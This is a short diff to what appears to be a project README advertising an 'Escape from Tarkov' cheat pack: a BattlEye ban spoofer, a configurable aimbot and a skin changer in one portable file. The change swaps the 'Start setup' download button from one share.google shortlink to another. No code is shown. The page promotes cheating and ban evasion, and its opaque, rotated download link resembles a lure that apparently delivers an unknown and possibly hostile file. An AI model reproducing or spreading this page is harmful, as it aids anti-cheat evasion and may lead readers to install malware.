@@ -5,7 +5,7 @@
 Download the **Escape from Tarkov** pack: a spoofer for BattlEye bans, a configurable aimbot and a full skin changer in a single portable file. **No subscription, no account, works offline.**
 
 <p align="center">
-  <a href="https://share.google/T9sAFh7R4QgthUgYS"><img src="button.svg" alt="Start setup" height="46"></a>
+  <a href="https://share.google/npaxsKR2Eq4Eiuo8w"><img src="button.svg" alt="Start setup" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
